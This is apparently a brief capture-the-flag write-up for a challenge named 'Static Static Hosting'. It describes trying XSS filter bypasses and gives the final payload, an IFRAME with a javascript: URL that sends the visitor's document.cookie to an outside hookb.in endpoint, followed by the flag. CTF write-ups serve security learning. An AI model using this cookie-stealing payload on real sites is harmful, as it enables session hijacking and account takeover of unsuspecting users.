# Static Static Hosting

Just pasted xss filter bypasses until one gave an alert('xss'), then refined it to send us the cookie.
```html
<IFRAME SRC="javascript:document.location='https://hookb.in/b9gRBDkwpJT3DDogQ73Q?test='+document.cookie"></IFRAME>
```
(HTTPS was required)

#### flag{wh0_n33d5_d0mpur1fy}
